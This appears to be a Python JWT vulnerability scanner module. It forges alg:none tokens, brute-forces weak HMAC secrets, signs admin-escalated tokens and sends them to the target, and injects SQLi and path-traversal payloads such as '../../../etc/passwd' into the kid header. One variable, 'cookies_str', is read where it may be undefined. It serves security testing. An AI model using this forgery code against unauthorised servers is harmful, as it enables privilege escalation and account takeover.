"""
JWT Vulnerability Scanner (④)
==============================
Detects JSON Web Tokens in HTTP responses/cookies/headers and tests for
common JWT vulnerabilities:

  1. Algorithm confusion / alg:none attack
  2. Weak HMAC secret brute-force
  3. ``kid`` header parameter injection (SQLi / path traversal)
  4. Payload tampering (role/admin escalation without re-signing)
  5. Missing expiry (``exp`` claim absent)
  6. Sensitive data exposure in the payload

Check types emitted
-------------------
  jwt_alg_none        — signature stripped, server still accepts token
  jwt_weak_secret     — HMAC secret is a common password
  jwt_kid_injection   — kid parameter is injectable
  jwt_payload_tamper  — unsigned/re-encoded payload accepted
  jwt_no_expiry       — token has no exp claim
  jwt_sensitive_data  — PII / credentials found inside token payload
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import secrets
import time
from typing import TYPE_CHECKING, Optional
from urllib.parse import urlparse

import httpx

from wscan.scanner_contract import (
    CapabilityState, Carrier, CarrierCapability, CostClass, ExecutionKind,
    PayloadShape, Prerequisite, ScannerContract, StateChangeClass, TransportKind,
    ValueKind,
)

from .base import BaseScanner, Finding

if TYPE_CHECKING:
    from wscan.engine import ScanEngine


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

# Matches a 3-part base64url-encoded string (header.payload.signature)
_JWT_RE = re.compile(
    r"eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*"
)

# Common weak secrets used in JWT brute-force
_WEAK_SECRETS = [
    "secret", "password", "123456", "qwerty", "letmein", "admin", "changeme",
    "mysecret", "supersecret", "jwt_secret", "jwttoken", "token", "key",
    "mykey", "privatekey", "secret_key", "app_secret", "api_secret", "test",
    "development", "production", "staging", "default", "example", "sample",
    "demo", "master", "root", "abc123", "pass", "passwd", "welcome",
    "hello", "world", "trustno1", "dragon", "baseball", "iloveyou",
    "monkey", "shadow", "sunshine", "princess", "football",
    "123456789", "12345678", "1234567", "123123", "111111",
    "access", "access_token", "refresh", "refresh_token",
    "HS256", "HS384", "HS512",
]

# Sensitive field names whose presence in JWT payload is notable
_SENSITIVE_FIELDS_RE = re.compile(
    r"(password|passwd|secret|credit_card|ssn|social_security|dob|date_of_birth"
    r"|bank_account|cvv|pin|private_key|api_key|access_key|auth_token)",
    re.IGNORECASE,
)

_HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/120.0.0.0 Safari/537.36"
    ),
    "Accept": "application/json, text/html, */*",
}


def _b64url_decode(s: str) -> bytes:
    """Decode base64url without padding."""
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)


def _b64url_encode(b: bytes) -> str:
    """Encode bytes to base64url without padding."""
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _parse_jwt(token: str) -> Optional[tuple[dict, dict, str]]:
    """
    Parse a JWT into (header, payload, signature).
    Returns None if token is malformed.
    """
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return header, payload, parts[2]
    except Exception:
        return None


def _build_jwt(header: dict, payload: dict, secret: str = "", algorithm: str = "HS256") -> str:
    """Build a signed (or unsigned) JWT."""
    h_enc = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p_enc = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h_enc}.{p_enc}".encode()

    if not secret:
        return f"{h_enc}.{p_enc}."  # alg:none — no signature

    if algorithm in ("HS256", "HS384", "HS512"):
        algo_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
        sig = hmac.new(secret.encode(), signing_input, algo_map[algorithm]).digest()
        return f"{h_enc}.{p_enc}.{_b64url_encode(sig)}"

    return f"{h_enc}.{p_enc}."  # fallback: unsigned


def _verify_hs(token: str, secret: str) -> bool:
    """Return True if the token's HMAC signature matches the given secret."""
    parts = token.split(".")
    if len(parts) != 3:
        return False
    try:
        header = json.loads(_b64url_decode(parts[0]))
        alg = header.get("alg", "HS256")
        if alg not in ("HS256", "HS384", "HS512"):
            return False
        algo_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        expected_sig = hmac.new(secret.encode(), signing_input, algo_map[alg]).digest()
        actual_sig = _b64url_decode(parts[2])
        return hmac.compare_digest(expected_sig, actual_sig)
    except Exception:
        return False


# ---------------------------------------------------------------------------
# Scanner
# ---------------------------------------------------------------------------

class JWTScanner(BaseScanner):
    """
    Detects JWT tokens in HTTP responses/cookies and tests common
    JWT attack vectors.
    """

    HAS_PAGE_LEVEL = True
    CHECK_TYPE = "jwt"
    CONTRACT = ScannerContract(
        execution_kinds=frozenset({ExecutionKind.PAGE_ANALYSIS}),
        capabilities=(
            CarrierCapability(
                carrier=Carrier.QUERY, state=CapabilityState.UNSUPPORTED,
                reason="page/response 解析でありパラメータ注入をしない",
            ),
            CarrierCapability(
                carrier=Carrier.FORM, state=CapabilityState.UNSUPPORTED,
                reason="page/response 解析でありパラメータ注入をしない",
            ),
            CarrierCapability(
                carrier=Carrier.JSON, state=CapabilityState.UNSUPPORTED,
                reason="page/response 解析でありパラメータ注入をしない",
            ),
            CarrierCapability(
                carrier=Carrier.XML, state=CapabilityState.UNSUPPORTED,
                reason="page/response 解析でありパラメータ注入をしない",
            ),
            CarrierCapability(
                carrier=Carrier.MULTIPART, state=CapabilityState.UNSUPPORTED,
                reason="page/response 解析でありパラメータ注入をしない",
            ),
            CarrierCapability(
                # _probe_token() が改変 JWT を Authorization: Bearer ヘッダとして HTTPX 送信し
                # kid/alg none 等の受理を検査するため supported。
                carrier=Carrier.HEADER, state=CapabilityState.SUPPORTED,
                value_kinds=frozenset({ValueKind.STRING}),
                transports=frozenset({TransportKind.HTTPX}),
                payload_shapes=frozenset({PayloadShape.SCALAR}),
            ),
            CarrierCapability(
                # _probe_token() は改変 JWT を token/jwt/access_token cookie としても送るため supported。
                carrier=Carrier.COOKIE, state=CapabilityState.SUPPORTED,
                value_kinds=frozenset({ValueKind.STRING}),
                transports=frozenset({TransportKind.HTTPX}),
                payload_shapes=frozenset({PayloadShape.SCALAR}),
            ),
            CarrierCapability(
                carrier=Carrier.PATH, state=CapabilityState.UNSUPPORTED,
                reason="page/response 解析でありパラメータ注入をしない",
            ),
            CarrierCapability(
                carrier=Carrier.GRAPHQL, state=CapabilityState.UNSUPPORTED,
                reason="page/response 解析でありパラメータ注入をしない",
            ),
            CarrierCapability(
                carrier=Carrier.WEBSOCKET, state=CapabilityState.UNSUPPORTED,
                reason="page/response 解析でありパラメータ注入をしない",
            ),
        ),
        state_change=StateChangeClass.READ_ONLY,
        cost=CostClass.MEDIUM,
    )

    SEVERITY = "high"

    def __init__(self, engine: "ScanEngine"):
        super().__init__(engine)
        self._tested_tokens: set[str] = set()
        self._found_jwts: list[tuple[str, str, str]] = []  # (token, source, url)

    def _client_proxy_kwargs(self) -> dict:
        proxy = getattr(self.engine, "proxy", "") or None
        return {"proxy": proxy} if proxy else {}

    def _client_transport_kwargs(self) -> dict:
        if hasattr(self.engine, "httpx_client_kwargs"):
            return self.engine.httpx_client_kwargs()
        return {"verify": False, **self._client_proxy_kwargs()}

    async def scan_field(
        self,
        url: str,
        form_index: int,
        field: dict,
        is_url_param: bool = False,
    ) -> list[Finding]:
        return []  # JWT testing is page/session level

    async def scan_page(self, url: str) -> list[Finding]:
        """
        Fetch the page and extract JWTs from cookies, headers, and body.
        Then run vulnerability tests.
        """
        timeout = float(getattr(self.engine, "timeout", 30))

        # Build request headers — pull through engine.auth_headers() so custom
        # --header values and refreshed bearer tokens are always included.
        req_headers = dict(_HEADERS)
        if hasattr(self.engine, "auth_headers"):
            req_headers.update(self.auth_headers_for_url(url))
        else:
            cookies_str = getattr(self.engine, "cookies", "") or ""
            if cookies_str:
                req_headers["Cookie"] = cookies_str

        # Fetch the target page
        try:
            async with httpx.AsyncClient(
                follow_redirects=True,
                timeout=timeout,
                headers=req_headers,
                **self._client_transport_kwargs(),
            ) as client:
                resp = await client.get(url)
                self._record_probe_status(resp)
        except Exception:
            return []

        findings: list[Finding] = []

        # ── Collect JWTs ────────────────────────────────────────────────
        jwts: list[tuple[str, str]] = []  # (token, source_description)

        # From Set-Cookie response headers
        for hname, hval in resp.headers.multi_items():
            if hname.lower() == "set-cookie":
                for m in _JWT_RE.finditer(hval):
                    jwts.append((m.group(0), f"Set-Cookie: {hval[:80]}"))
            if hname.lower() == "authorization":
                for m in _JWT_RE.finditer(hval):
                    jwts.append((m.group(0), "Authorization response header"))

        # From response body
        for m in _JWT_RE.finditer(resp.text[:20000]):
            jwts.append((m.group(0), "response body"))

        # From the current session cookies (passed via --cookie)
        if cookies_str:
            for m in _JWT_RE.finditer(cookies_str):
                jwts.append((m.group(0), "session cookie"))

        # Deduplicate
        seen_tokens: set[str] = set()
        unique_jwts = []
        for token, source in jwts:
            if token not in seen_tokens and token not in self._tested_tokens:
                seen_tokens.add(token)
                self._tested_tokens.add(token)
                unique_jwts.append((token, source))

        if not unique_jwts:
            return []

        # ── Run tests on each unique JWT ────────────────────────────────
        for token, source in unique_jwts:
            parsed = _parse_jwt(token)
            if not parsed:
                continue
            header, payload, sig = parsed

            # Test 1: Missing expiry
            no_exp = await self._test_no_expiry(url, token, header, payload, source, timeout)
            if no_exp:
                findings.append(no_exp)

            # Test 2: Sensitive data in payload
            sensitive = self._test_sensitive_data(url, token, payload, source)
            if sensitive:
                findings.append(sensitive)

            # Test 3: alg:none attack
            alg = header.get("alg", "")
            if alg.startswith("HS") or alg.lower() == "none":
                none_finding = await self._test_alg_none(
                    url, token, header, payload, source, timeout, req_headers
                )
                if none_finding:
                    findings.append(none_finding)

            # Test 4: Weak secret brute-force (HS256/384/512 only)
            if alg.startswith("HS"):
                weak_finding = await self._test_weak_secret(
                    url, token, header, payload, source, alg, timeout, req_headers
                )
                if weak_finding:
                    findings.append(weak_finding)

            # Test 5: kid header injection
            if "kid" in header:
                kid_finding = await self._test_kid_injection(
                    url, token, header, payload, source, timeout, req_headers
                )
                if kid_finding:
                    findings.append(kid_finding)

            # Test 6: Payload tamper (role escalation)
            tamper_finding = await self._test_payload_tamper(
                url, token, header, payload, source, timeout, req_headers
            )
            if tamper_finding:
                findings.append(tamper_finding)

        return findings

    # ------------------------------------------------------------------
    # Individual tests
    # ------------------------------------------------------------------

    def _test_sensitive_data(
        self,
        url: str,
        token: str,
        payload: dict,
        source: str,
    ) -> Optional[Finding]:
        """Check if the JWT payload contains sensitive field names."""
        sensitive_keys = [
            k for k in payload
            if _SENSITIVE_FIELDS_RE.search(k)
        ]
        if not sensitive_keys:
            return None

        return Finding(
            check_type="jwt_sensitive_data",
            severity="medium",
            url=url,
            field_name=f"JWT payload ({source})",
            payload=token[:80] + "...",
            evidence=(
                f"JWT payload contains potentially sensitive fields: "
                f"{', '.join(sensitive_keys)}. "
                f"Sensitive data should not be stored in JWT payloads as they "
                f"are base64-encoded (not encrypted) and readable without the secret."
            ),
            request={"url": url, "method": "GET"},
            response={"status": 200, "url": url},
            confidence="likely",
            evidence_type="jwt_sensitive_data",
            evidence_details={
                "token": token,
                "sensitive_keys": sensitive_keys,
                "source": source,
            },
        )

    async def _test_no_expiry(
        self,
        url: str,
        token: str,
        header: dict,
        payload: dict,
        source: str,
        timeout: float,
    ) -> Optional[Finding]:
        """Check if the JWT has no exp claim."""
        if "exp" in payload:
            return None

        return Finding(
            check_type="jwt_no_expiry",
            severity="medium",
            url=url,
            field_name=f"JWT ({source})",
            payload=token[:80] + "...",
            evidence=(
                f"JWT token has no 'exp' (expiration) claim. "
                f"Tokens without an expiry never become invalid, meaning a "
                f"compromised token remains valid indefinitely. "
                f"Algorithm: {header.get('alg', 'unknown')}"
            ),
            request={"url": url, "method": "GET"},
            response={"status": 200, "url": url},
            confidence="likely",
            evidence_type="jwt_no_expiry",
            evidence_details={
                "token": token,
                "alg": header.get("alg", "unknown"),
                "source": source,
            },
        )

    async def _test_alg_none(
        self,
        url: str,
        token: str,
        header: dict,
        payload: dict,
        source: str,
        timeout: float,
        base_headers: dict,
    ) -> Optional[Finding]:
        """Test if the server accepts a JWT with alg:none (no signature)."""
        none_header = dict(header)
        none_header["alg"] = "none"
        # Try several none variations (servers may check case-insensitively)
        for none_variant in ("none", "None", "NONE", "nOnE"):
            none_header["alg"] = none_variant
            none_token = _build_jwt(none_header, payload, secret="")
            accepted = await self._probe_token(url, none_token, base_headers, timeout)
            if accepted:
                return Finding(
                    check_type="jwt_alg_none",
                    severity="critical",
                    url=url,
                    field_name=f"JWT ({source})",
                    payload=none_token[:120] + "...",
                    evidence=(
                        f"Algorithm confusion attack (alg:none): The server accepted a JWT "
                        f"with alg='{none_variant}' and no signature. "
                        f"An attacker can forge arbitrary tokens without knowing the secret key. "
                        f"Original algorithm: {header.get('alg')}"
                    ),
                    request={"url": url, "method": "GET",
                             "headers": {"Authorization": f"Bearer {none_token[:60]}..."}},
                    response={"status": 200, "url": url},
                    confidence="likely",
                    evidence_type="jwt_alg_none",
                    evidence_details={
                        "token": token,
                        "probe_token": none_token,
                        "none_variant": none_variant,
                        "original_alg": header.get("alg"),
                        "source": source,
                    },
                )
        return None

    async def _test_weak_secret(
        self,
        url: str,
        token: str,
        header: dict,
        payload: dict,
        source: str,
        alg: str,
        timeout: float,
        base_headers: dict,
    ) -> Optional[Finding]:
        """Brute-force HMAC secret against a list of common passwords."""
        for secret in _WEAK_SECRETS:
            if _verify_hs(token, secret):
                # Secret confirmed — now build a tampered token to verify server accepts it
                tampered_payload = dict(payload)
                # Elevate role/admin if present
                for role_key in ("role", "roles", "is_admin", "admin", "type", "permission"):
                    if role_key in tampered_payload:
                        tampered_payload[role_key] = "admin"
                forged = _build_jwt(header, tampered_payload, secret=secret, algorithm=alg)
                accepted = await self._probe_token(url, forged, base_headers, timeout)
                return Finding(
                    check_type="jwt_weak_secret",
                    severity="critical" if accepted else "high",
                    url=url,
                    field_name=f"JWT ({source})",
                    payload=f"secret='{secret}'",
                    evidence=(
                        f"JWT signed with weak secret '{secret}'. "
                        + (
                            "A forged admin token was accepted by the server — "
                            "full token forgery confirmed."
                            if accepted
                            else "Secret brute-forced; token could be forged offline."
                        )
                        + f" Algorithm: {alg}"
                    ),
                    request={"url": url, "method": "GET"},
                    response={"status": 200, "url": url},
                    confidence="confirmed" if accepted else "likely",
                    evidence_type="jwt_weak_secret",
                    evidence_details={
                        "token": token,
                        "secret": secret,
                        "algorithm": alg,
                        "forged_token": forged,
                        "server_accepted_forged": accepted,
                        "source": source,
                    },
                )
        return None

    async def _test_kid_injection(
        self,
        url: str,
        token: str,
        header: dict,
        payload: dict,
        source: str,
        timeout: float,
        base_headers: dict,
    ) -> Optional[Finding]:
        """Test kid header for SQLi and path traversal injection."""
        kid_payloads = [
            ("SQLi", "' OR 1=1--"),
            ("SQLi", "'; SELECT 1--"),
            ("path traversal", "../../../../dev/null"),
            ("path traversal", "../../../etc/passwd"),
        ]
        for vuln_type, kid_val in kid_payloads:
            injected_header = dict(header)
            injected_header["kid"] = kid_val
            # Build token with the original signature (we're testing header parsing)
            injected_token = _build_jwt(injected_header, payload, secret="")
            accepted = await self._probe_token(url, injected_token, base_headers, timeout)
            if accepted:
                return Finding(
                    check_type="jwt_kid_injection",
                    severity="critical",
                    url=url,
                    field_name=f"JWT kid header ({source})",
                    payload=f'kid="{kid_val}"',
                    evidence=(
                        f"JWT 'kid' header parameter injection ({vuln_type}): "
                        f"The server processed a token with kid='{kid_val}' and returned "
                        f"a successful response. If the kid value is used in a database "
                        f"query or file path without sanitisation, this may be exploitable."
                    ),
                    request={"url": url, "method": "GET"},
                    response={"status": 200, "url": url},
                    confidence="likely",
                    evidence_type="jwt_kid_injection",
                    evidence_details={
                        "token": token,
                        "probe_token": injected_token,
                        "kid": kid_val,
                        "vuln_type": vuln_type,
                        "source": source,
                    },
                )
        return None

    async def _test_payload_tamper(
        self,
        url: str,
        token: str,
        header: dict,
        payload: dict,
        source: str,
        timeout: float,
        base_headers: dict,
    ) -> Optional[Finding]:
        """
        Test if the server accepts a token where role/admin fields
        have been changed to 'admin' with a broken/removed signature.
        """
        role_keys = [k for k in payload if k in ("role", "roles", "is_admin", "admin",
                                                   "type", "permission", "scope", "group")]
        if not role_keys:
            return None

        original_vals = {k: payload[k] for k in role_keys}
        # Skip if already admin
        if all(str(v).lower() in ("admin", "true", "1", "superuser") for v in original_vals.values()):
            return None

        tampered = dict(payload)
        for k in role_keys:
            tampered[k] = "admin"

        # Send with broken signature (empty sig)
        tamper_header = dict(header)
        tamper_header["alg"] = "HS256"
        tampered_token = _build_jwt(tamper_header, tampered, secret="")
        accepted = await self._probe_token(url, tampered_token, base_headers, timeout)
        if not accepted:
            return None

        return Finding(
            check_type="jwt_payload_tamper",
            severity="critical",
            url=url,
            field_name=f"JWT payload ({source})",
            payload=f"tampered: {role_keys} → admin",
            evidence=(
                f"JWT payload tampering: Modified {role_keys} from "
                f"{list(original_vals.values())} to 'admin' with an invalid signature, "
                f"and the server returned a successful response. "
                f"The server is not verifying JWT signatures."
            ),
            request={"url": url, "method": "GET"},
            response={"status": 200, "url": url},
            confidence="likely",
            evidence_type="jwt_payload_tamper",
            evidence_details={
                "token": token,
                "probe_token": tampered_token,
                "role_keys": role_keys,
                "original_values": original_vals,
                "source": source,
            },
        )

    # ------------------------------------------------------------------
    # Probe helper
    # ------------------------------------------------------------------

    async def _probe_token(
        self,
        url: str,
        token: str,
        base_headers: dict,
        timeout: float,
    ) -> bool:
        """
        Send a request with the modified token (both as Authorization Bearer
        and as a cookie named 'token'/'jwt'/'access_token') and return True
        if the server responds with a 2xx status and no login gate.
        """
        if not await self._token_gets_access(url, token, base_headers, timeout):
            return False

        invalid = self._invalid_control_token()
        return not await self._token_gets_access(url, invalid, base_headers, timeout)

    def _invalid_control_token(self) -> str:
        header = {"alg": "HS256", "typ": "JWT"}
        payload = {"sub": f"wscan-invalid-{secrets.token_hex(4)}"}
        return _build_jwt(header, payload, secret="definitely-not-the-real-secret")

    async def _token_gets_access(
        self,
        url: str,
        token: str,
        base_headers: dict,
        timeout: float,
    ) -> bool:
        from .privesc import LOGIN_GATE_RE  # reuse existing heuristic

        variants = [
            {**base_headers, "Authorization": f"Bearer {token}"},
            {**base_headers, "Cookie": f"token={token}"},
            {**base_headers, "Cookie": f"jwt={token}"},
            {**base_headers, "Cookie": f"access_token={token}"},
        ]

        for headers in variants:
            try:
                async with httpx.AsyncClient(
                    follow_redirects=False,
                    timeout=timeout,
                    headers=headers,
                    **self._client_transport_kwargs(),
                ) as client:
                    resp = await client.get(url)
                    self._record_probe_status(resp)
                    if 200 <= resp.status_code < 300:
                        if not LOGIN_GATE_RE.search(resp.text[:4000]):
                            return True
            except Exception:
                continue
        return False

    async def verify_finding(self, finding: Finding) -> bool | None:
        details = getattr(finding, "evidence_details", {}) or {}
        token = details.get("token")
        parsed = _parse_jwt(token) if token else None

        if finding.check_type == "jwt_no_expiry":
            if not parsed:
                return None
            _, payload, _sig = parsed
            return "exp" not in payload

        if finding.check_type == "jwt_sensitive_data":
            if not parsed:
                return None
            _, payload, _sig = parsed
            keys = details.get("sensitive_keys") or []
            return any(key in payload and _SENSITIVE_FIELDS_RE.search(key) for key in keys)

        if finding.check_type == "jwt_weak_secret":
            secret = details.get("secret")
            return bool(token and secret and _verify_hs(token, secret))

        if finding.check_type in {"jwt_alg_none", "jwt_kid_injection", "jwt_payload_tamper"}:
            probe_token = details.get("probe_token")
            if not probe_token:
                return None
            headers = dict(_HEADERS)
            if hasattr(self.engine, "auth_headers"):
                headers.update(self.auth_headers_for_url(finding.url))
            else:
                cookies_str = getattr(self.engine, "cookies", "") or ""
                if cookies_str:
                    headers["Cookie"] = cookies_str
            timeout = float(getattr(self.engine, "timeout", 30))
            return await self._probe_token(finding.url, probe_token, headers, timeout)

        return None
